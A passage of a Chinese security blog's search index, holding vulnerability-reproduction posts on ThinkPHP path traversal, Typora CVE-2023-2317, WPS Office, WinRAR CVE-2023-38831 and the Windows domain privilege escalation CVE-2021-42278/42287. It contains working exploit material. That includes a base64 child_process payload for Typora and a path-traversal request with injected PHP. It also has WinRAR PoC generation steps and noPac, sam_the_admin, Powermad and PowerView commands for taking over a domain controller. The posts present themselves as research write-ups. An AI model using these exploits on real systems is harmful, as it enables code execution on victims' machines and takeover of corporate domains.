class=\"number\">16.12</span>; rv:<span class=\"number\">129.0</span>) Gecko/<span class=\"number\">20230101</span> Firefox/<span class=\"number\">169.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">think-lang:../../../../../../../../tmp/nihao2</span></span><br><span class=\"line\"><span class=\"comment\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: think_lang=zh-cn</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 12</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">w=phpinfo();</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"GLWHx5a3SsGhTvmxKP5FEPt2BFMzg-DHNtC22UxI2Jg.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","Thinkphp"]},{"title":"Typora远程代码执行漏洞复现(CVE-2023-2317)","url":"/2023/09/04/Typora%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2023-2317)/","content":"<h1 id=\"Typora远程代码执行漏洞复现-CVE-2023-2317\"><a href=\"#Typora远程代码执行漏洞复现-CVE-2023-2317\" class=\"headerlink\" title=\"Typora远程代码执行漏洞复现(CVE-2023-2317)\"></a>Typora远程代码执行漏洞复现(CVE-2023-2317)</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Typora是一款由Abner Lee开发的轻量级Markdown编辑器，适用于OS X、Windows和Linux三种操作系统。如果用户在 Typora 中打开恶意文件，或从恶意网页复制文本并粘贴到 Typora 中，则会导致恶意代码在本地执行。这漏洞出来也有一段时间了，下面我们来简单分析复现一下。</p>\n<h2 id=\"漏洞详情及影响版本\"><a href=\"#漏洞详情及影响版本\" class=\"headerlink\" title=\"漏洞详情及影响版本\"></a>漏洞详情及影响版本</h2><p>在 Windows 及 Linux 上的 Typora 1.6.7 之前版本中，updater&#x2F;update.html 內存在一个DOM 的 XSS，可用过在标签中加载typora:&#x2F;&#x2F;app&#x2F;typemark&#x2F;updater&#x2F;update.html 的方式，在 Typora主页面的情況下制作 markdown文件，执行任意 JavaScript 代码。</p>\n<p>影响版本</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Typora &lt; <span class=\"number\">1.6</span><span class=\"number\">.7</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Typora1.5.12下载地址（非官方）,没找到官方的，我直接搜索从第三方下载了一个</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//mksoftcdn.yesky.com/64f57baf/f200b5674f7956b8742f572bfa71f12a/uploadsoft/typora-setup-x64-1.5.12.exe</span></span><br></pre></td></tr></table></figure>\n<p>查看详情确认一下版本</p>\n<p><img src=\"3saB_e6APyMV9_v-P23WWNzM6y_CNuLRB0RlntAEdY4.jpg\" alt=\"image\"></p>\n<p>粘贴下面的poc进行保存</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;embed style=<span class=\"string\">&quot;height:0;&quot;</span> src=<span class=\"string\">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>语言选择HTML</p>\n<p><img src=\"7jtOe181HfL4xhYhi-aTfvX4207zH7_WBtDr8GwhKiI.jpg\" alt=\"image\"></p>\n<p>保存后即可弹计算器</p>\n<p><img src=\"LiGzDAMdQ2EM6gF37-uKYel3rhFjQdYGoJPN8Cp9tm8.jpg\" alt=\"image\"></p>\n<p>直接打开md文件也会执行</p>\n<p><img src=\"sPNhwAIuzl8fMPGwWmoVex7GxA8LTPcTEjlcMFlh0gg.jpg\" alt=\"image\"></p>\n<p>分析一次POC，主要是看一下base64编码部分的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk</span><br></pre></td></tr></table></figure>\n<p>这段代码的原理是使用 Node.js 中的 child_process 模块来执行特定的操作系统命令。</p>\n<p>通过三元表达式，使用 navigator.platform.substr(0,5) 来获取当前运行代码的操作系统平台（Windows、macOS、Linux等）。如果是在Win32平台下，就执行calc。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">reqnode(<span class=\"string\">&#x27;child_process&#x27;</span>).exec((&#123;Win32: <span class=\"string\">&#x27;calc&#x27;</span>&#125;)[navigator.platform.substr(<span class=\"number\">0</span>,<span class=\"number\">5</span>)])</span><br><span class=\"line\"></span><br><span class=\"line\">兼容win和Linux的POC</span><br><span class=\"line\"><span class=\"title function_\">reqnode</span><span class=\"params\">(<span class=\"string\">&#x27;child_process&#x27;</span>)</span>.exec((&#123;Win32: <span class=\"string\">&#x27;calc&#x27;</span>, Linux: <span class=\"string\">&#x27;gnome-calculator -e &quot;Typora RCE&quot;&#x27;</span>&#125;)[navigator.platform.substr(<span class=\"number\">0</span>,<span class=\"number\">5</span>)])</span><br></pre></td></tr></table></figure>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><p>目前厂商已发布升级补丁已修复漏洞，请尽快升级</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://loudongyun.360.net/leakDetail/wgDZIzy1cFY%3D\">https://loudongyun.360.net/leakDetail/wgDZIzy1cFY%3D</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE"]},{"title":"WPS Office远程代码执行复现与分析","url":"/2023/08/09/WPS%20Office%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/","content":"<h1 id=\"WPS-Office远程代码执行复现与分析\"><a href=\"#WPS-Office远程代码执行复现与分析\" class=\"headerlink\" title=\"WPS Office远程代码执行复现与分析\"></a>WPS Office远程代码执行复现与分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>WPS ofrice是中国金山软件(Kingsoft)公司的一种办公软件提供文件处理功能。近日，网传WPSOrrice for windows 版本存在0day 漏洞，攻击者可以利用该 day 漏洞在受害者主机上执行任意恶意文件；目前已经发现了该0day漏洞的在野利用。大家都在传，我也来水一篇文章了，踩了一些坑，在此记录一下。遇到了大反转，文章后半部分有分析。</p>\n<h2 id=\"漏祠描述\"><a href=\"#漏祠描述\" class=\"headerlink\" title=\"漏祠描述\"></a>漏祠描述</h2><p>WPS Office  for  windows的内置浏览器存在逻辑漏涧，攻击者可以利用该漏祠专门构造出恶意文档，受害者打开该文档并点击文档中的URL链接或包含了超级链接的图片时，存在漏润版本的WPS office会通过内嵌浏览器加载该链接，接着该链接中js脚本会通过cefQuery调用WPS端内API下载文件并打开文件，进而导致恶意文件在受害者电脑上被运行。</p>\n<h2 id=\"成功的环境\"><a href=\"#成功的环境\" class=\"headerlink\" title=\"成功的环境\"></a>成功的环境</h2><p>试了好几个环境，只有这个成功了。但是非常奇怪！！！</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">wps <span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.12300</span></span><br><span class=\"line\">Windows <span class=\"number\">10</span> 专业版 </span><br><span class=\"line\">操作系统内部版本 <span class=\"number\">19045.3208</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>wps下载地址：<a href=\"https://official-package.wpscdn.cn/wps/download/WPS_Setup_12300.exe\">https://official-package.wpscdn.cn/wps/download/WPS_Setup_12300.exe</a></p>\n<p>我这里下载的版本是：wps 11.1.0.12300。下载完成之后，直接安装即可。</p>\n<p><img src=\"96hklQtbMRKcjYGIM5Bx5lsuYb10f2xTCIgiNmFY1Eg.png\" alt=\"image\"></p>\n<p>host添加</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> clientweb.docer.wps.cn.cloudwps.cn</span><br></pre></td></tr></table></figure>\n<p><img src=\"MqSutRKx0FMw48puN4wp9McHucg9AL2b-lLE6NjmVw8.png\" alt=\"image\"></p>\n<p>用python起一个web服务，在</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -m http.server <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"9CihoCP24BG-1B35oHie34XR-qjGwVyL5TC5fuj9xBo.png\" alt=\"image\"></p>\n<p>然后双击POC的poc.docx，成功弹计算器！但是我观察到了一个奇怪的问题，我起的web没有被请求，居然就弹计算器了。</p>\n<p><img src=\"ROGFnq8RPz7SSuvKIep4oN7KTldqsoal23oOYiqoOek.png\" alt=\"image\"></p>\n<p>复现视频：</p>\n<h2 id=\"多个测试环境\"><a href=\"#多个测试环境\" class=\"headerlink\" title=\"多个测试环境\"></a>多个测试环境</h2><p>我测试了以下几个环境</p>\n<p>第一个系统</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows10 专业版</span><br><span class=\"line\">版本 <span class=\"number\">1703</span> </span><br><span class=\"line\">OS版本<span class=\"number\">15063.0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.10667</span>  没成功</span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.13703</span>  没成功</span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.14309</span>  没成功</span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.12300</span>  没成功</span><br></pre></td></tr></table></figure>\n<p>第二个系统（也就是我上面成功弹计算器的）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows <span class=\"number\">10</span> 专业版</span><br><span class=\"line\">版本 22H2</span><br><span class=\"line\">OS版本 <span class=\"number\">19045.3208</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.10667</span>  没成功</span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.13703</span>  没成功</span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.14309</span>  没成功</span><br><span class=\"line\"><span class=\"number\">11.1</span><span class=\"number\">.0</span><span class=\"number\">.12300</span>  成功</span><br></pre></td></tr></table></figure>\n<h2 id=\"反转\"><a href=\"#反转\" class=\"headerlink\" title=\"反转\"></a>反转</h2><p>上面提到了我的web没有被访问就弹计算器了，我想一探究竟是什么原因，我解压了压缩包之后看到了，两个可以的文件分别是poc&#x2F;word&#x2F;embeddings&#x2F;Workbook1.xlsx和poc&#x2F;word&#x2F;media&#x2F;image1.png</p>\n<p>在poc&#x2F;word&#x2F;webExtensions&#x2F;webExtension1.xml文件中可以看到确实有请求<a href=\"http://clientweb.docer.wps.cn.cloudwps.cn/1.html\">http://clientweb.docer.wps.cn.cloudwps.cn/1.html</a></p>\n<p><img src=\"t203G00mFTlpK3uB7ZH_jMF8qzLBjhZHs4St9nBFH_E.png\" alt=\"image\"></p>\n<p>poc&#x2F;word&#x2F;media&#x2F;image1.png文件</p>\n<p><img src=\"bvCdoEQv1lAJUdyJo0IDNyebkkbQSwC1uHOI_ENA2UE.png\" alt=\"image\"></p>\n<p>poc&#x2F;word&#x2F;embeddings&#x2F;Workbook1.xlsx文件</p>\n<p><img src=\"kD9qtVsuTtHYIv_8H4P8A7gs-4Fkf4-stpUCH3MIdnA.png\" alt=\"image\"></p>\n<h2 id=\"分析Workbook1-xlsx\"><a href=\"#分析Workbook1-xlsx\" class=\"headerlink\" title=\"分析Workbook1.xlsx\"></a>分析Workbook1.xlsx</h2><p>分析了一圈Workbook1.xlsx，打开看了看宏没找到啥。解压查找可疑文件也未发现可疑文件。</p>\n<h2 id=\"新的docx\"><a href=\"#新的docx\" class=\"headerlink\" title=\"新的docx\"></a>新的docx</h2><p>于是我创建一个新的qwe.docx文件，把原poc的内容拷贝到我新创建的docx文件中，保存之后打开，发现也弹计算器了。</p>\n<p><img src=\"gj5PUme-qX1yhQlveu7XzkM7KAnYbpKZ_gpCCWIU6Dg.png\" alt=\"image\"></p>\n<p>于是便可以锁定弹计算器的问题就在内容上，经过我仔细的摸索，便发现了文章里面藏在一个图片。</p>\n<p><img src=\"Xu0YqHu2kOjbDEVaGkAEEUvRyKKTJ1NV42nllFkpzkw.png\" alt=\"image\"></p>\n<p>我把图片复制到新的asd.docx文件中也可以实现打开弹计算器。</p>\n<p><img src=\"iYmv3hsjM2L_GB-l1T9BI_HsDtQqVQVXmvEpkENZr1c.png\" alt=\"image\"></p>\n<p>复现视频：</p>\n<h2 id=\"分析隐藏图片\"><a href=\"#分析隐藏图片\" class=\"headerlink\" title=\"分析隐藏图片\"></a>分析隐藏图片</h2><p>微步报告：<a href=\"https://s.threatbook.com/report/file/c7a14dbfbfc39d11eb15e1282251ac1c6903dfc793586944bb0a58357e2c757b\">https://s.threatbook.com/report/file/c7a14dbfbfc39d11eb15e1282251ac1c6903dfc793586944bb0a58357e2c757b</a></p>\n<p><img src=\"6gOa5XUsRfxPfnNQZYouN06boYPComBaxqWcy2PdhzA.png\" alt=\"image\"></p>\n<p><img src=\"JjIFsHDWhRi2pWeH4tUgQx432gd7sY2Bf4HGEzIkaEA.png\" alt=\"image\"></p>\n<p>尝试用工具分析无果</p>\n<p><img src=\"q87d-E2osyGwk5oCZotnqvMTh8WF1Ovq2a5-CX4EGSg.png\" alt=\"image\"></p>\n<p>继续分析发现</p>\n<p>在不能弹计算器的wps版本中是可以正常请求poc&#x2F;word&#x2F;webExtensions&#x2F;webExtension1.xml中写好了的URL：<a href=\"http://clientweb.docer.wps.cn.cloudwps.cn/1.html\">http://clientweb.docer.wps.cn.cloudwps.cn/1.html</a></p>\n<p>但是在能弹计算机的环境下是没有解析。</p>\n<p><img src=\"Ab-3JKbxGi1wIWKuINoiCBcEt3iZ4C4fXbDbWvoZOE8.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.网传的poc可以在特定的wps版本中打开后执行图片里面的内容进行弹计算器，但貌似不算是漏洞描述所触发的。</p>\n<p>2.多个  WPS 0fFice 2023 个人版&lt;11.1.0.15120 都未复现，poc存在可疑？</p>\n<p>3.也有人说这是个老洞，吾爱破解去年有讨论过：<a href=\"https://www.52pojie.cn/thread-1670740-1-1.html\">https://www.52pojie.cn/thread-1670740-1-1.html</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE"]},{"title":"WinRAR 代码执行漏洞复现（CVE-2023-38831）","url":"/2023/08/27/WinRAR%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2023-38831%EF%BC%89/","content":"<h1 id=\"WinRAR-代码执行漏洞复现（CVE-2023-38831）\"><a href=\"#WinRAR-代码执行漏洞复现（CVE-2023-38831）\" class=\"headerlink\" title=\"WinRAR 代码执行漏洞复现（CVE-2023-38831）\"></a>WinRAR 代码执行漏洞复现（CVE-2023-38831）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>WinRAR是一个压缩文件的文件压缩程序，因此它们占用的硬盘空间更少。它支持三种压缩格式，ZIP，RAR和新的RAR5格式;在此版本中，RAR5提供了更好的压缩率。它是WinZip或7-Zip的推荐替代品。WinRAR允许您使用256位AES加密算法使用密码保护压缩文件 。近期发现该程序存在代码执行漏洞，下面做一下简单的复现。</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">WinRAR &lt;<span class=\"number\">6.23</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>WinRAR 在处理压缩包内同名的文件与文件夹时存在代码执行漏洞。攻击者构建由恶意文件与非恶意文件构成的特制压缩包文件，诱导受害者打开此文件中看似无害的文件（如JPG文件）后，将在受害者机器上执行任意代码。</p>\n<p>下载的软件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">7</span>-zip：https:<span class=\"comment\">//7-zip.org</span></span><br><span class=\"line\">WinRar：http:<span class=\"comment\">//www.winrar.com.cn/download.htm</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"6bQJKMmwXx774vDjxCJVJl1eLwhsBEBeD_QWYUEnoP8.png\" alt=\"image\"></p>\n<p>制作恶意的压缩文件，可以使用7-zip这个工具，在压缩好的压缩包里面建立一个文件夹，以及一个文件，两者名称需要一致。</p>\n<p><img src=\"UBv1cjtIgJ-xKg50v0at1CT7nvOGLDSn2_kdtRU3y4M.png\" alt=\"image\"></p>\n<p>然后再把恶意的.cmd文件拖入到文件夹中（名称需要和文件夹一致）</p>\n<p><img src=\"meZRyKY7JIb2WybNN-6OcDV0HVcdrBlt1t7yVgezn6o.png\" alt=\"image\"></p>\n<p>最终用winrar打开的时候双击jpg文件即可执行cmd文件的代码；我这里cmd的代码是</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">star calc</span><br></pre></td></tr></table></figure>\n<p>成功弹出计算器</p>\n<p><img src=\"45lNP4bdYB6zQYVD64ihVCfvJNLrX9ppmvWs55v_U0k.png\" alt=\"image\"></p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><p>后来索性使用go编写一个程序来直接生成恶意的POC文件。</p>\n<p>该项目已经开源放到了GitHub了，链接如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//github.com/Garck3h/cve-2023-38831</span></span><br></pre></td></tr></table></figure>\n<p>使用起来也很简单，直接使用如下命令可以生成你想要的自定义的poc文件</p>\n<p>编译</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">go build cve-<span class=\"number\">2023</span>-<span class=\"number\">38831.</span>go</span><br></pre></td></tr></table></figure>\n<p>使用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cve-<span class=\"number\">2023</span>-<span class=\"number\">38831.</span>exe <span class=\"number\">1234.</span>jpg payload.cmd poc.zip</span><br></pre></td></tr></table></figure>\n<p><img src=\"uEQZhjoVfAF89JvFVE5-doRKwNGLvddYSluOZ5vBI9Q.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>虽然该漏洞看着危害不是很大，但是很有利于用来钓鱼，从而可以撕开企业的口子。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://mp.weixin.qq.com/s/wmmE1TfNb8bYw0nCJI9saA\">https://mp.weixin.qq.com/s/wmmE1TfNb8bYw0nCJI9saA</a></p>\n<p><a href=\"https://github.com/b1tg/CVE-2023-38831-winrar-exploit\">https://github.com/b1tg/CVE-2023-38831-winrar-exploit</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE"]},{"title":"Windows域服务权限提升（CVE-2021-42287）","url":"/2022/04/07/Windows%E5%9F%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88CVE-2021-42287%EF%BC%89/","content":"<h1 id=\"Windows域服务权限提升（CVE-2021-42287）\"><a href=\"#Windows域服务权限提升（CVE-2021-42287）\" class=\"headerlink\" title=\"Windows域服务权限提升（CVE-2021-42287）\"></a>Windows域服务权限提升（CVE-2021-42287）</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Microsoft Windows Active Directory 域服务权限提升漏洞（CVE-2021-42278、CVE-2021-42287）攻击者可利用该漏洞将域内的普通用户权限提升到域管理员权限，造成风险和危害极大。</p>\n<h2 id=\"靶场环境：\"><a href=\"#靶场环境：\" class=\"headerlink\" title=\"靶场环境：\"></a>靶场环境：</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">域：fbi.gov</span><br><span class=\"line\">域控：dc.fbi.gov</span><br><span class=\"line\">普通域用户：fbi\\fileserver</span><br></pre></td></tr></table></figure>\n<p>影响范围</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">CVE-2021-42278</span><br><span class=\"line\">￮ Windows Server 2012 R2</span><br><span class=\"line\">￮ Windows Server 2012 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2012</span><br><span class=\"line\">￮ Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class=\"line\">￮ Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class=\"line\">￮ Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class=\"line\">￮ Windows Server 2016 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2016</span><br><span class=\"line\">￮ Windows Server, version 20H2 (Server Core Installation)</span><br><span class=\"line\">￮ Windows Server, version 2004 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2022 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2019 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2022￮ Windows Server 2019</span><br><span class=\"line\">￮ Windows Server 2012 R2 (Server Core installation)</span><br></pre></td></tr></table></figure>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）一个普通域成员帐户。</span><br><span class=\"line\">（2）域用户有创建机器用户的权限（一般默认权限）。</span><br><span class=\"line\">（3）DC未打补丁KB5008380或KB5008602。</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"直接利用一（noPac-py）\"><a href=\"#直接利用一（noPac-py）\" class=\"headerlink\" title=\"直接利用一（noPac.py）\"></a>直接利用一（noPac.py）</h2><p><a href=\"https://github.com/cube0x0/noPac\">https://github.com/cube0x0/noPac</a></p>\n<p>扫描探测（noPac.py）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\noPac.exe scan -domain fbi.gov -user fileserver -pass <span class=\"string\">&#x27;QWEasd1234&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>直接利用（noPac.py）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\noPac.exe -domain fbi.gov -user fileserver -pass <span class=\"string\">&#x27;QWEasd1234&#x27;</span> /dc dc.fbi.gov /mAccount garck /mPassword pass123 /service cifs /ptt</span><br></pre></td></tr></table></figure>\n<p><img src=\"0.8681485612867944.png\" alt=\"image\"></p>\n<p>若用户存在的话，则会显示对象已经存在</p>\n<p><img src=\"62c1fb32-ebb9-4bac-9b4c-a219d2344728.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> //dc.fbi.gov/c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"0.8251252992718687.png\" alt=\"image\"></p>\n<p>当服务器xxx时，再攻击DC域控的时候会出现下面的情况</p>\n<p><img src=\"1c7b83a0-48c1-438c-a207-65615554f6d0.png\" alt=\"image\"></p>\n<h2 id=\"直接利用二（sam-the-admin-py）\"><a href=\"#直接利用二（sam-the-admin-py）\" class=\"headerlink\" title=\"直接利用二（sam_the_admin.py）\"></a>直接利用二（sam_the_admin.py）</h2><p><strong>注意⚠️：从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有hash（IP为访问到）。</strong></p>\n<p><a href=\"https://github.com/WazeHell/sam-the-admin\">https://github.com/WazeHell/sam-the-admin</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 sam_the_admin.py fbi.gov/fileserver:<span class=\"string\">&#x27;QWEasd1234&#x27;</span> -dc-ip 192.168.8.11 -shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"b24fd0cb-ce22-4f8c-9580-fe5dd14907e6.png\" alt=\"image\"></p>\n<p>当服务器xxx时，再攻击DC域控的时候会出现下面的情况</p>\n<p><img src=\"4c59e895-9183-4fb5-a7b9-2d240765b4c8.png\" alt=\"image\"></p>\n<h2 id=\"本地复现\"><a href=\"#本地复现\" class=\"headerlink\" title=\"本地复现\"></a>本地复现</h2><h3 id=\"1、普通域成员账户\"><a href=\"#1、普通域成员账户\" class=\"headerlink\" title=\"1、普通域成员账户\"></a>1、普通域成员账户</h3><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">net user fileserver /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"5d95aa78-e29c-4780-b250-1e630bc93989.png\" alt=\"image\"></p>\n<h3 id=\"2、利用-powermad-ps1-新增机器帐号testspn（域用户默认可以新建机器账户）\"><a href=\"#2、利用-powermad-ps1-新增机器帐号testspn（域用户默认可以新建机器账户）\" class=\"headerlink\" title=\"2、利用 powermad.ps1 新增机器帐号testspn（域用户默认可以新建机器账户）\"></a>2、利用 powermad.ps1 新增机器帐号testspn（域用户默认可以新建机器账户）</h3><p>下载地址：<a href=\"https://github.com/Kevin-Robertson/Powermad\">https://github.com/Kevin-Robertson/Powermad</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Powermad.ps1</span><br><span class=\"line\">//若报错执行 Set-ExecutionPolicy Unrestricted</span><br><span class=\"line\">New-MachineAccount -MachineAccount testspn -Domain fbi.gov -DomainController dc.fbi.gov -Verbose</span><br><span class=\"line\">//密码输入123.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"b0f5c505-c050-485c-ae6e-aca22dc7caf6.png\" alt=\"image\"></p>\n<h3 id=\"3、Clear-its-SPNs（利用PowerView清除SPN信息）\"><a href=\"#3、Clear-its-SPNs（利用PowerView清除SPN信息）\" class=\"headerlink\" title=\"3、Clear its SPNs（利用PowerView清除SPN信息）\"></a>3、Clear its SPNs（利用PowerView清除SPN信息）</h3><p>更改执行策略，以管理员身份打开 PowerShell 输入：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">如果要更改回Windows 客户端计算机的默认执行策略，则设置为restricted：set-executionpolicy restricted</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//需要ps1版本impact套件</span><br><span class=\"line\">Import-Module .\\PowerView.ps1</span><br><span class=\"line\">Set-DomainObject <span class=\"string\">&quot;CN=testspn,CN=Computers,DC=fbi,DC=gov&quot;</span> -Clear <span class=\"string\">&#x27;serviceprincipalname&#x27;</span> -Verbose</span><br></pre></td></tr></table></figure>\n<p><img src=\"4dc5ad32-e97f-48ca-94c8-3dd0e1bdbe96.png\" alt=\"image\"></p>\n<h3 